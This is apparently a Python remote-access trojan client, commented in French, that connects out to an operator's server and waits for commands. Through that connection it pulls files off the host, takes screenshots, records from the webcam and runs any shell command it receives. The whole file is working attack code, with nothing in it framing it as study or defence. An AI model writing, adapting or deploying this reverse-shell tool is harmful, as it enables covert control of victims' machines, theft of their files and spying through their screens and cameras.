import cv2
import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab

# Informations de connexion au serveur
HOST_IP = "127.0.0.1"  # Entrer l'adresse IP du serveur ici
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# Initialisation des variables pour la capture vidéo
is_recording = False
cap = None
out = None

while True:
    commande_data = s.recv(MAX_DATA_SIZE)
    if not commande_data:
        break
    commande = commande_data.decode()
    print("Commande : ", commande)

    commande_split = commande.split(" ")

    # Informations système
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    
    # Changement de répertoire
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = "Répertoire changé avec succès"
        except FileNotFoundError:
            reponse = "ERREUR : ce répertoire n'existe pas"
        reponse = reponse.encode()

    # Télécharger un fichier
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            with open(commande_split[1], "rb") as f:
                reponse = f.read()
        except FileNotFoundError:
            reponse = "ERREUR : fichier non trouvé".encode()

    # Capture d'écran
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        capture_ecran = ImageGrab.grab()
        capture_filename = commande_split[1] + ".png"
        capture_ecran.save(capture_filename, "PNG")
        try:
            with open(capture_filename, "rb") as f:
                reponse = f.read()
        except FileNotFoundError:
            reponse = "ERREUR : capture non trouvée".encode()

    # Commandes système
    elif commande == "start_video":
        if not is_recording:
            # Démarrer la capture vidéo
            cap = cv2.VideoCapture(0)
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('output.avi', fourcc, 20.0, (640, 480))
            is_recording = True
            reponse = "Démarrage de l'enregistrement vidéo".encode()
        else:
            reponse = "Enregistrement vidéo déjà en cours".encode()

    elif commande == "stop_video":
        if is_recording:
            # Arrêter la capture vidéo
            cap.release()
            out.release()
            cv2.destroyAllWindows()
            is_recording = False
            reponse = "Arrêt de l'enregistrement vidéo".encode()
        else:
            reponse = "Aucun enregistrement vidéo en cours".encode()

    else:
        # Exécution d'une commande shell
        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
        reponse = (resultat.stdout + resultat.stderr).encode()
        if not reponse:
            reponse = "Aucune sortie".encode()

    # Envoi de la réponse au serveur
    data_len = len(reponse)
    header = str(data_len).zfill(13)
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)
    
    # Si la vidéo est en cours d'enregistrement, capturer et enregistrer les frames
    if is_recording:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
            cv2.imshow('Video', frame)
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

# Libérer les ressources avant de quitter
if is_recording:
    cap.release()
    out.release()
cv2.destroyAllWindows()
s.close()
